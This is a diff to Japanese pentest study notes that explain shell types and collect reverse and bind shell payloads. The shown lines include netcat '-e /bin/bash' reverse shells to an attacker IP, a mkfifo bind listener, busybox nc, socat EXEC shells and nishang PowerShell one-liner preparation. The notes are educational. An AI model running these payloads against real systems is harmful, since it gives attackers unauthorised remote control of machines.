@@ -19,7 +19,10 @@
 
  * ユーザーの入力を常に待ち受け、実行結果が即座に返ってくる対話型
  * プロンプト（`$` や `#`）が表示され、タブ補完や履歴機能、ジョブコントロールが利用可能
+ 
  ![](../../画像ファイル/Pasted%20image%2020230318182041.png)
+
+$$インタラクティブシェルの出力例$$
 
 ### 非インタラクティブシェル（非対話型シェル）
 
@@ -27,7 +30,11 @@
  * Reverse ShellやBind Shellの初期状態（いわゆるDumb Shell）の多くはこの形式
  * ユーザーに入力を求めるプログラム（sshのパスワード入力、sudoのプロンプトなど）は、対話のための端末デバイスがないため実行できない
  * 下のキャプチャのように、引数だけで完結するwhoamiは問題なく実行できるが、対話的なセッションを必要とするsshは正常に動作しない
-   ![ 300](../../画像ファイル/Pasted%20image%2020230318182007.png)
+   
+ ![](../../画像ファイル/Pasted%20image%2020230318182007.png)
+
+$$非インタラクティブシェルの出力例$$
+
    （上記listenerコマンドはsudo rlwrap nc -lvnp 443のaliasとして説明している）
 
 ## Bind Shellとは
@@ -46,8 +53,13 @@ nc -lvnp <Port> -e "cmd.exe"
 ```zsh
 nc <target_IP> <Port>
 ```
+
 ![ 900](../../画像ファイル/Pasted%20image%2020230318180927.png)
+
 $$左が攻撃側、右がターゲット側$$
+
+> [!NOTE]
+> Bind Shellは実践ではほとんど使わない。
 
 ## Reverse Shellとは
 
@@ -64,7 +76,9 @@ sudo rlwrap nc -lvnp <Port>
 ```
 nc <attacker_IP> <Port> -e /bin/bash
 ```
+
 ![](../../画像ファイル/Pasted%20image%2020230318180351.png)
+
 $$左が攻撃側、右がターゲット側$$
 
 ---
@@ -72,17 +86,14 @@ $$左が攻撃側、右がターゲット側$$
 
 # Common Shell Payloads
 
-参考：[Reverse Shell Cheat Sheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+参考🔗：[Reverse Shell Cheat Sheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ## 🐧Linuxターゲット
 
 ### Bind Shell for Linux
 
-> [!NOTE]
-> 実践ではほとんど使わない。
-
 1. ターゲットマシン上でリスナーを用意する
-	 ([What is the shell](#補足：名前付きパイプコマンドの解説))
+	 ([補足：名前付きパイプコマンドの解説](#補足：名前付きパイプコマンドの解説))
 ```zsh
 mkfifo /tmp/f; nc -lvnp <Port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
@@ -142,9 +153,6 @@ busybox nc <attacker_IP> <Port> -e sh
 ## 🪟Windowsターゲット
 
 ### Bind Shell for Windows
-
-> [!NOTE]
-> 実践ではほとんど使わない。
 
 1. ターゲットマシン上でリスナーを用意
 ```cmd
@@ -371,6 +379,7 @@ socat TCP:<attacker_IP>:<Port> EXEC: "bash -li",pty,stderr,sigint,setsid,sane
 - `sane`：端末を安定させる
 
 ![ 800](../../画像ファイル/Pasted%20image%2020230319131940.png)
+
 $$Socatによる安定化実例$$
 
 ### Reverse Shell w/ Socat(非対話型)
@@ -431,7 +440,9 @@ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
 ```zsh
 subl Invoke-PowerShellTcpOneLine.ps1
 ```
+
 ![](../../画像ファイル/Pasted%20image%2020251107074119.png)
+
 $$ペイロードは赤枠部分を使う(smは圧縮版）$$
 
 3. PowerShellスクリプトをシェルから直接渡すため、Base64エンコードする
